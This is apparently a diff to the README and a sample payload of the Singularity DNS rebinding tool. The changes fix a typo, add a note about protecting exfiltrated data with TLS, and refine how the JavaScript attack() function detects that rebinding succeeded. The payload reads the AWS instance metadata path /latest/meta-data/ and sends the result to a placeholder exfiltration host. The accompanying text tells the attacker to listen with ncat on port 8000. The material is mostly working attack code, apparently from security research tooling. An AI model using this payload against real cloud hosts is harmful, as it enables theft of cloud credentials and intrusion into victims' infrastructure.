@@ -7,12 +7,13 @@ Replace `EXFILTRATION_URL` with the host and path to exfiltrate data e.g. http:/
 Change `AWS_METADATA_PATH` as appropriate to exfiltrate the desired data e.g. `/latest/meta-data/`...
 
 Run a tool such as `ncat` e.g. `ncat -lkv 8000` on the attacker host to capture the exfiltrated data.
+Use TLS if you want to protect the exfiltrated data in transit.
 
 Run the Singularity server using the `DNSRebindFromQueryMultiA` DNS rebinding strategy e.g
 `./singularity-server -DNSRebindStrategy DNSRebindFromQueryMultiA -HTTPServerPort 80`
 
 Ensure that `manager-config.json` contains this payload only,
-and any other revelant information. Sample configuration:
+and any other relevant information. Sample configuration:
 
 {
     "attackHostDomain": "dynamic.your.domain",
@@ -41,9 +42,9 @@ and any other revelant information. Sample configuration:
     <script>
         function attack() {
             let response;
-            let EXFILTRATION_URL = "http://host:port/";
+            let EXFILTRATION_URL = "http://xxxx.xxx:xxxxx/";
             let AWS_METADATA_PATH = "/latest/meta-data/";
-            
+
             fetch(AWS_METADATA_PATH)
                 .then(function (r) { //response
                     response = r;
@@ -58,14 +59,19 @@ and any other revelant information. Sample configuration:
                     }
                 })
                 .then(function (data) { // data
-                    if (data.length > 0) {
+                    if (!(data.length > 0)) {
+                        throw new Error('nodata')
+                    }
+                    if (data.includes(indextoken) == false) {
                         clearInterval(timer); // stop the attack timer
                         console.log("SUCCESS"); // log to the console
                         exploit(EXFILTRATION_URL, data);
                     } else {
-                        throw new Error('nodata')
+                        // We saw the token in the response. DNS Rebinding did not happen.
+                        // Let's wait for the next time.
+                        throw new Error('hastoken');
                     }
-                }).then(function() {
+                }).then(function () {
                     attackSuccess("Data was exfiltrated.");
                 })
                 .catch(function (error) {
